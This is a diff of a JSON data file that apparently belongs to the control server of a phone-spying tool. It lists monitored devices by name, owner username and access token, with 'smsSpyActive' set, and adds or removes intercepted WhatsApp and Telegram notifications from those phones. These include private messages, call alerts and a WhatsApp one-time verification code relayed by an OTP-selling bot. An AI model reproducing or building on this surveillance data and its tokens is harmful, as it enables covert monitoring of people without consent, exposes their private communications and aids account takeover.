@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776773592772,
+    "lastSeen": 1776773602048,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -6331,6 +6331,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎7Sex Message (183 pesan): ~ hyurά",
+        "content": "Hei karbit, teruslah menjadi karbit. Temukan gambar istri barumu di saluran kami:\nhttps://whatsapp.com/channel/0029Vay0gom9cDDSRxFMgh2b\n\n- Ingin menghilangkan iklan seperti ini? upgrade grup kamu ke VIP/VVIP dengan command !VIP",
+        "time": "21/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773595164
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎3509 pesan dari 23 chat",
         "time": "21/04 19:13",
@@ -10320,14 +10328,6 @@
         "time": "21/04 18:16",
         "pkg": "com.whatsapp",
         "receivedAt": 1776770200402
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3284 pesan dari 22 chat",
-        "time": "21/04 18:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776770199402
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776773592141,
+    "lastSeen": 1776773601307,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776773594169,
+    "lastSeen": 1776773603179,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Nanat",
+        "content": "📹 Telepon video masuk",
+        "time": "21/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773603248
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Nanat",
+        "content": "📹 Telepon video masuk",
+        "time": "21/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773603232
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773595621
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14378,30 +14402,6 @@
         "time": "21/04 18:16",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776770208599
-      },
-      {
-        "appName": "Telegram",
-        "sender": "./j4X¡tsme な #sa #flory 🎖️",
-        "content": "Noktel id 1 gw sisa 2 biji di g.a in gas ga ges??",
-        "time": "21/04 18:16",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776770207328
-      },
-      {
-        "appName": "Telegram",
-        "sender": "BOT KONTOL",
-        "content": "Start untuk cek bot!",
-        "time": "21/04 18:16",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776770207317
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "🔔 NEW OTP RECEIVED!\n━━━━━━━━━━━━━━━\n📱 Service: WHATSAPP\n🌍 Country: Indonesia\n📞 Number: +62********657\n💰 Price: Rp 4.100\n🔢 Code: 698751\n━━━━━━━━━━━━━━━\n📨 Message:\n Kode WhatsApp: 698-751\nJangan bagikan kode ini dengan orang lain\n4sgLq1p5sV6\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO0008685706\n🏷️ System ID: FSCL86997281\n⏰ 21 Apr 2026 • 18:15 WIB\n\n#OTP #WHATSAPP",
-        "time": "21/04 18:16",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776770207304
       }
     ],
     "galleryPhotos": [],
